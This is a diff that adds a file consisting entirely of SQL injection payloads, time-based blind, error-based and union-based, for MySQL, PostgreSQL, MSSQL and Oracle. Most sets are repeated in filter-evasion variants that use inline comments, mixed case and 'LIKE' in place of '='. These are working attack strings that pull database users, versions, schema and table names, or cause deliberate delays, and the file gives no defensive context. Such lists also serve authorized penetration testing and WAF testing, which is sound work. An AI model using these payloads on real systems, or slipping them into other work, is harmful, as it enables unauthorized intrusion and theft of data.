@@ -1,0 +1,198 @@
+/**/Blind/**/
+SQL/**/	Injection/**/ Payloads:/**/ MySQL/**/1'/**/And/**/(sElect/**/IF(1LIKE 1,/**/ SLEEP(5),/**/ 0))/**/--/**/#
+1'/**/	anD/**/(sELeCT/**/	CASE/**//**/WHEN/**/ (1LIKE 1)/**/ THEN/**/SLEEP(5)/**/ ELSE/**/ 0/**/ END)/**/--/**/ --
+1'/**/ANd/**/ASCII(SUBSTRING((SeLect/**/USer()),1,1))/**/
+>/**/
+64/**/ --/**//*abc*/
+PostgreSQL/**/1'/**/ANd/**/CASE/**/WHEN/**/(1LIKE1)/**//**/THEN/**/ pg_sleep(5)/**/ELSE/**/pg_sleep(0)/**/ END/**/--/**/
+1'/**/aNd/**/	ASCII(SUBSTRING(current_user,1,1))/**/ >/**/ 64/**/--/**/ #
+MSSQL/**/1'/**/IF/**/(1LIKE1)/**/WAITFOR/**/DELAY/**/'0:0:5'/**/--/**/ /*abc*/
+1'/**/aND/**/ASCII(SUBSTRING(SYSTEM_USER,1,1))/**/>/**/64/**/--/**//*abc*/
+Oracle/**/1'/**/AND/**/CASE/**/WHEN/**/1LIKE1/**/THEN/**/ DBMS_LOCK.SLEEP(5)/**/ ELSE/**/ NULL/**/END/**/ FRom/**/ dual/**/--/**/ 
+1'/**/aND/**/
+ASCII(SUBSTR(UsEr,1,1))/**/>/**/64/**/	fROM/**/dual/**/--/**/
+/**/Error/**/Based/**/SQL/**/	Injection/**/Payloads:/**/ MySQL/**/ 1'/**/anD/**/ (SeLECt/**/ 1/**/FRom/**/(SeLECt/**/COUNT(*),/**/CONCAT(USEr(),/**/ FLOOR(RAND()*2))/**/ x/**/FRom/**/ information_schema.tables/**/ GROUP/**/ BY/**/x)/**/a)/**/ --/**/ #
+1'/**/aNd/**/EXTRACTVALUE(1,/**/CONCAT(0x7e,/**/User()))/**/--/**/ #
+1'/**/aND/**/UPDATEXML(NULL,/**/CONCAT(0x3a,/**/ vErSiOn()),/**/ NULL)/**/ --/**/ /*abc*/
+1'/**/and/**/ (seLecT/**/ 1/0)/**/ --/**/ --
+1'/**//**/AnD/**/CAST('abc'/**/AS/**/ DECIMAL)/**/--/**/ --
+1'/**/ANd/**/JSON_EXTRACT('invalid',/**/'$.key')/**/--/**//*abc*/
+PostgreSQL/**//**/1'/**/aNd/**/(seLEct/**/ to_char(1,'999')/**/ ||/**/ current_user/**/||/**/to_char(1,'999'))/**/ =/**/ 1/**/ --/**/ --
+1'/**/anD/**/to_number('abc',/**/'999')/**/=/**/1/**/--/**/	
+1'/**/
+ANd/**/ CAST('text'/**/AS/**/INTEGER)/**/ =/**/ 1/**/ --/**/
+1'/**/anD/**//**/(selecT/**//**/COUNT(*)/**/ from/**/ generate_series(1,1000000000))/**/=/**/1/**/ --/**//*abc*/
+1'/**/
+and/**/ (SeLEcT/**/ 1/(SeLEcT/**/ COUNT(*)/**/ fROm/**/ pg_user/**/ WhERe/**/ usename='admin'))/**/ =/**/ 1/**/--/**/ 
+MSSQL/**/1'/**//**/aND/**/1=CONVERT(INT,/**/(SELEcT/**/ @@VerSION))/**/ --/**/ #
+1'/**/AND/**/1=CAST('a'/**/AS/**/INT)/**/--/**/ 
+1'/**/aNd/**//**/(SeLEcT/**/1/0)/**/ --/**/ 
+1'/**/anD/**/(sELECT/**/	name/**/FRom/**/sysobjects/**/ WHERe/**/xtype='U')/**/=/**/1/**/--/**/
+1'/**/aNd/**/CHARINDEX('a',/**/1)/**/=/**/1/**/--/**/ 
+Oracle/**/1'/**/and/**/1=(seleCT/**/UTL_INADDR.GET_HOST_ADDRESS('localhost'))/**/ frOm/**/ dual/**/--/**/ --
+1'/**/And/**/(SElecT/**/sys_context('userenv','current_user')/**/
+FrOm/**/dual)/**/=/**/1/**/ --/**/ /*abc*/
+1'/**/anD/**/	TO_NUMBER('abc')/**/=/**/ 1/**/ --/**/ 
+1'/**/ANd/**/ (seLeCT/**/ 1/**/FRom/**/DUAL/**/whErE/**/ 1LIKE 1/**/GROUP/**/BY/**/ ROWNUM,/**/ ROWNUM)/**/=/**/1/**/ --/**/ --
+1'/**//**/ANd/**/
+LENGTH(TO_CHAR(SYSDATE))/**/=/**/1/**/--/**/ 
+/**/
+UnIOn/**/Based/**//**/SQL/**/Injection/**/ Payloads:/**/ MySQL/**/1'/**/ UnIOn/**/seLECT/**/null,/**/USer()/**/ --/**/ /*abc*/
+1'/**/unIoN/**/sElEcT/**/
+1,/**/vERSiON(),/**/
+database()/**/ --/**/ 
+1'/**//**/unioN/**/SElECT/**//**/table_name,/**/ column_name/**/FROm/**/ information_schema.columns/**/--/**/ 
+1'/**/
+UnioN/**/ SELeCt/**/ 1,/**/ GROUP_CONCAT(schema_name)/**/fROM/**/ information_schema.schemata/**/--/**/ --
+PostgreSQL/**/1'/**/unIoN/**/SELECt/**//**/null,/**/
+current_user/**/--/**/#
+1'/**/UnIon/**/sELECt/**/	1,/**/veRSiOn(),/**/current_database()/**/--/**/#
+1'/**/
+UNioN/**/ SelECt/**/ table_name,/**/column_name/**/ FRom/**/information_schema.columns/**/ --/**/
+MSSQL/**/1'/**/union/**/SELECT/**/NULL,/**/ SYSTEM_USER/**/ --/**/
+1'/**/UNion/**/SelECt/**/	name,/**/type/**/FROM/**//**/sysobjects/**/--/**/ #
+1'/**/UnION/**/seLecT/**/	1,/**/@@veRsIon/**/--/**/
+Oracle/**/1'/**/uNION/**/SELECt/**/NULL,/**/
+usER/**/fRoM/**//**/dual/**/--/**//*abc*/
+1'/**/UNION/**/SeLeCt/**/table_name,/**/column_name/**/ frOM/**/all_tab_columns/**/ --/**/ 
+1'/**/UNIoN/**/SElEct/**//**/1,/**/ banner/**/fROM/**/v$vErSiOn/**/--/**/ 
+/**/Blind/**/SQL/**/Injection/**/ Payloads:/**/ MySQL/**/1'/**/ AnD/**/(SelEct/**/ IF(1LIKE 1,/**/ SLEEP(5),/**/0))/**/--/**/
+1'/**/
+ANd/**/(SeLEcT/**/CASE/**/
+WHEN/**/(1LIKE/**/1)/**/THEN/**/SLEEP(5)/**/ELSE/**/ 0/**/ END)/**/--/**/
+1'/**/AnD/**/ASCII(SUBSTRING((seLeCt/**/
+UsEr()),1,1))/**/>/**/64/**/ --/**/
+PostgreSQL/**/1'/**//**/ANd/**/CASE/**/WHEN/**/(1LIKE 1)/**/THEN/**/ pg_sleep(5)/**/ELSE/**/pg_sleep(0)/**/END/**/--/**/ 
+1'/**//**/AnD/**/ASCII(SUBSTRING(current_user,1,1))/**/
+>/**/64/**/--/**/#
+MSSQL/**/1'/**/	IF/**/(1LIKE 1)/**/ WAITFOR/**/DELAY/**/ '0:0:5'/**/ --/**/ /*abc*/
+1'/**/And/**/ASCII(SUBSTRING(SYSTEM_USER,1,1))/**/>/**/64/**/--/**/
+
+Oracle/**//**/1'/**/	AND/**/CASE/**/ WHEN/**/1LIKE 1/**/ THEN/**/ DBMS_LOCK.SLEEP(5)/**/ELSE/**/ NULL/**/ END/**/froM/**/dual/**/--/**/ 
+1'/**/aNd/**/ ASCII(SUBSTR(uSeR,1,1))/**/ >/**/64/**/ FRoM/**/ dual/**/ --/**/
+/**/Blind/**//**/SQL/**/Injection/**/Payloads:/**/ MySQL/**/ 1'/**/ AnD/**/(SelECT/**/ IF(1LIKE 1,/**/ SLEEP(5),/**/0))/**/ --/**/ /*abc*/
+1'/**/aND/**/(SELeCT/**/CASE/**/WHEN/**/(1LIKE	1)/**/THEN/**/ SLEEP(5)/**/ ELSE/**/ 0/**/ END)/**/ --/**/ 
+1'/**/AND/**/ASCII(SUBSTRING((SelecT/**/ uSER()),1,1))/**/>/**/ 64/**/ --/**/ 
+PostgreSQL/**/1'/**/AND/**/CASE/**/WHEN/**/ (1LIKE 1)/**/ THEN/**/pg_sleep(5)/**/ELSE/**/ pg_sleep(0)/**/END/**/ --/**/
+1'/**/and/**/ASCII(SUBSTRING(current_user,1,1))/**//**/>/**/ 64/**/ --/**//*abc*/
+MSSQL/**/1'/**/IF/**/ (1LIKE 1)/**/ WAITFOR/**/ DELAY/**/ '0:0:5'/**/ --/**/ --
+1'/**/And/**/ASCII(SUBSTRING(SYSTEM_USER,1,1))/**/>/**/64/**/--/**/ #
+Oracle/**/1'/**/ANd/**/CASE/**/WHEN/**/1LIKE1/**//**/THEN/**/ DBMS_LOCK.SLEEP(5)/**/ ELSE/**/ NULL/**/END/**/ fROM/**/ dual/**/--/**/#
+1'/**/aNd/**/ASCII(SUBSTR(uSeR,1,1))/**/>/**/ 64/**/FROm/**/ dual/**/--/**/ /*abc*/
+
+Blind SQL Injection Payloads:
+MySQL
+1' AND (SELECT IF(1=1, SLEEP(5), 0)) -- 
+1' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) -- 
+1' AND ASCII(SUBSTRING((SELECT user()),1,1)) > 64 -- 
+PostgreSQL
+1' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END -- 
+1' AND ASCII(SUBSTRING(current_user,1,1)) > 64 -- 
+MSSQL
+1' IF (1=1) WAITFOR DELAY '0:0:5' -- 
+1' AND ASCII(SUBSTRING(SYSTEM_USER,1,1)) > 64 -- 
+Oracle
+1' AND CASE WHEN 1=1 THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM dual -- 
+1' AND ASCII(SUBSTR(USER,1,1)) > 64 FROM dual -- 
+
+Error Based SQL Injection Payloads:
+MySQL
+1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(user(), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) a) -- 
+1' AND EXTRACTVALUE(1, CONCAT(0x7e, user())) -- 
+1' AND UPDATEXML(NULL, CONCAT(0x3a, version()), NULL) -- 
+1' AND (SELECT 1/0) -- 
+1' AND CAST('abc' AS DECIMAL) -- 
+1' AND JSON_EXTRACT('invalid', '$.key') -- 
+PostgreSQL
+1' AND (SELECT to_char(1,'999') || current_user || to_char(1,'999')) = 1 -- 
+1' AND to_number('abc', '999') = 1 -- 
+1' AND CAST('text' AS INTEGER) = 1 -- 
+1' AND (SELECT COUNT(*) FROM generate_series(1,1000000000)) = 1 -- 
+1' AND (SELECT 1/(SELECT COUNT(*) FROM pg_user WHERE usename='admin')) = 1 -- 
+MSSQL
+1' AND 1=CONVERT(INT, (SELECT @@version)) -- 
+1' AND 1=CAST('a' AS INT) -- 
+1' AND (SELECT 1/0) -- 
+1' AND (SELECT name FROM sysobjects WHERE xtype='U') = 1 -- 
+1' AND CHARINDEX('a', 1) = 1 -- 
+Oracle
+1' AND 1=(SELECT UTL_INADDR.GET_HOST_ADDRESS('localhost')) FROM dual -- 
+1' AND (SELECT sys_context('userenv','current_user') FROM dual) = 1 -- 
+1' AND TO_NUMBER('abc') = 1 -- 
+1' AND (SELECT 1 FROM DUAL WHERE 1=1 GROUP BY ROWNUM, ROWNUM) = 1 -- 
+1' AND LENGTH(TO_CHAR(SYSDATE)) = 1 -- 
+
+Union Based SQL Injection Payloads:
+MySQL
+1' UNION SELECT null, user() -- 
+1' UNION SELECT 1, version(), database() -- 
+1' UNION SELECT table_name, column_name FROM information_schema.columns -- 
+1' UNION SELECT 1, GROUP_CONCAT(schema_name) FROM information_schema.schemata -- 
+PostgreSQL
+1' UNION SELECT null, current_user -- 
+1' UNION SELECT 1, version(), current_database() -- 
+1' UNION SELECT table_name, column_name FROM information_schema.columns -- 
+MSSQL
+1' UNION SELECT NULL, SYSTEM_USER -- 
+1' UNION SELECT name, type FROM sysobjects -- 
+1' UNION SELECT 1, @@version -- 
+Oracle
+1' UNION SELECT NULL, user FROM dual -- 
+1' UNION SELECT table_name, column_name FROM all_tab_columns -- 
+1' UNION SELECT 1, banner FROM v$version -- 
+/**/	Blind/**/SQL/**/Injection/**/Payloads:/**/MySQL/**/1'/**/AnD/**/(seLECt/**/IF(1LIKE/**/1,/**/ SLEEP(5),/**/ 0))/**/ --/**/--
+1'/**//**/AND/**/(sElEcT/**/CASE/**/WHEN/**/(1LIKE 1)/**/ THEN/**/SLEEP(5)/**/ ELSE/**/ 0/**/ END)/**/--/**/ 
+1'/**/anD/**/ASCII(SUBSTRING((sElecT/**/ USeR()),1,1))/**/>/**/64/**/ --/**/
+PostgreSQL/**/	1'/**/anD/**/ CASE/**/ WHEN/**/(1LIKE 1)/**/THEN/**/ pg_sleep(5)/**/ ELSE/**/ pg_sleep(0)/**/ END/**/--/**/ --
+1'/**/AND/**//**/ASCII(SUBSTRING(current_user,1,1))/**/>/**/64/**/--/**/--
+MSSQL/**/1'/**/ IF/**/(1LIKE 1)/**/ WAITFOR/**/ DELAY/**/ '0:0:5'/**/ --/**/ 
+1'/**/And/**/
+ASCII(SUBSTRING(SYSTEM_USER,1,1))/**/>/**/64/**/ --/**/ --
+Oracle/**//**/1'/**/ANd/**/
+CASE/**/
+WHEN/**/ 1LIKE 1/**/THEN/**/ DBMS_LOCK.SLEEP(5)/**/ELSE/**/ NULL/**/END/**/FROM/**/ dual/**/ --/**/ 
+1'/**/AnD/**/ASCII(SUBSTR(uSEr,1,1))/**/>/**/64/**/fRoM/**//**/dual/**/ --/**/ 
+/**/
+Error/**/Based/**/
+SQL/**/Injection/**/Payloads:/**/MySQL/**/1'/**/ANd/**/ (seleCt/**/1/**/FRom/**/(seleCt/**/COUNT(*),/**/ CONCAT(usEr(),/**/FLOOR(RAND()*2))/**/ x/**/ FRom/**/ information_schema.tables/**/GROUP/**/BY/**/ x)/**/ a)/**/--/**/#
+1'/**/aNd/**/EXTRACTVALUE(1,/**/CONCAT(0x7e,/**/ useR()))/**/ --/**//*abc*/
+1'/**/ANd/**/UPDATEXML(NULL,/**/ CONCAT(0x3a,/**/VerSiON()),/**/NULL)/**/--/**/--
+1'/**/and/**/(sElEcT/**/1/0)/**/
+--/**/ 
+1'/**//**/aND/**/CAST('abc'/**/ AS/**/DECIMAL)/**/ --/**/ 
+1'/**/AND/**//**/JSON_EXTRACT('invalid',/**/'$.key')/**/--/**/#
+PostgreSQL/**/
+1'/**//**/aNd/**/(seLEct/**/to_char(1,'999')/**/||/**/current_user/**/||/**/to_char(1,'999'))/**/ =/**/ 1/**/--/**/ #
+1'/**/ANd/**/to_number('abc',/**/'999')/**/=/**/1/**/ --/**/
+1'/**/AnD/**/CAST('text'/**/AS/**/INTEGER)/**/=/**/1/**/--/**/--
+1'/**/And/**/(SeLeCt/**/COUNT(*)/**/FRoM/**/generate_series(1,1000000000))/**/ =/**/ 1/**/--/**/--
+1'/**/aND/**/ (SeLecT/**/1/(SeLecT/**/COUNT(*)/**/fRom/**/ pg_user/**/WHERe/**/usename='admin'))/**/ =/**/ 1/**/--/**/ #
+MSSQL/**/1'/**/and/**/1=CONVERT(INT,/**/(select/**/	@@vERSiOn))/**/ --/**/ /*abc*/
+1'/**/aNd/**/
+1=CAST('a'/**/AS/**/INT)/**/--/**//*abc*/
+1'/**/
+and/**/(sElEct/**/	1/0)/**/--/**/#
+1'/**/
+And/**/(SELECt/**/name/**/FrOm/**/sysobjects/**/wHeRE/**/ xtype='U')/**/=/**/ 1/**/ --/**/#
+1'/**/	aNd/**/ CHARINDEX('a',/**/ 1)/**/=/**/1/**/--/**/ /*abc*/
+Oracle/**/1'/**/ aND/**/1=(SelEcT/**/UTL_INADDR.GET_HOST_ADDRESS('localhost'))/**/From/**/dual/**/ --/**/#
+1'/**/AND/**//**/(sElect/**/sys_context('userenv','current_user')/**/
+fROM/**/dual)/**/=/**/1/**/--/**/
+
+1'/**/and/**//**/TO_NUMBER('abc')/**/=/**/ 1/**/ --/**/
+1'/**/And/**/ (SeLecT/**/ 1/**/fRoM/**/DUAL/**/WhErE/**/ 1LIKE 1/**/ GROUP/**/BY/**/ROWNUM,/**/ ROWNUM)/**/=/**/1/**/--/**/
+1'/**/ANd/**/	LENGTH(TO_CHAR(SYSDATE))/**/=/**/1/**/ --/**/ 
+/**/	UnIoN/**/ Based/**/SQL/**/ Injection/**/Payloads:/**/MySQL/**/ 1'/**/ UnIoN/**/ SelEct/**/null,/**/uSeR()/**/--/**/ 
+1'/**/UnIon/**/sELECT/**/1,/**/VErSioN(),/**/database()/**/ --/**/ 
+1'/**/uNiON/**/ SeleCT/**/table_name,/**/ column_name/**/FroM/**/ information_schema.columns/**/ --/**/--
+1'/**/uNIoN/**/SeLECT/**/ 1,/**/ GROUP_CONCAT(schema_name)/**/from/**/information_schema.schemata/**/ --/**/ 
+PostgreSQL/**/1'/**/uNIon/**/SeLECT/**/null,/**/current_user/**/ --/**/ 
+1'/**/	unIoN/**/seleCt/**/ 1,/**/VERSiOn(),/**/current_database()/**/--/**/
+1'/**/uniOn/**/SELEcT/**/table_name,/**/column_name/**/froM/**//**/information_schema.columns/**/--/**/
+MSSQL/**/1'/**/unIon/**/SEleCt/**/NULL,/**/SYSTEM_USER/**/ --/**/ --
+1'/**/UNIoN/**/seLECT/**/name,/**/type/**/FrOm/**/sysobjects/**/ --/**/
+1'/**/	uNIOn/**/SElECT/**/1,/**/@@VERSion/**/ --/**//*abc*/
+Oracle/**/1'/**/UNIoN/**/sElEct/**/NULL,/**/User/**/FROM/**/dual/**/ --/**/#
+1'/**/UNiOn/**/ SeLeCt/**/table_name,/**/column_name/**/fROM/**/ all_tab_columns/**/ --/**/--
+1'/**/uniON/**/sELECT/**/
+1,/**/	banner/**/	fROm/**/v$vERsIOn/**/--/**/
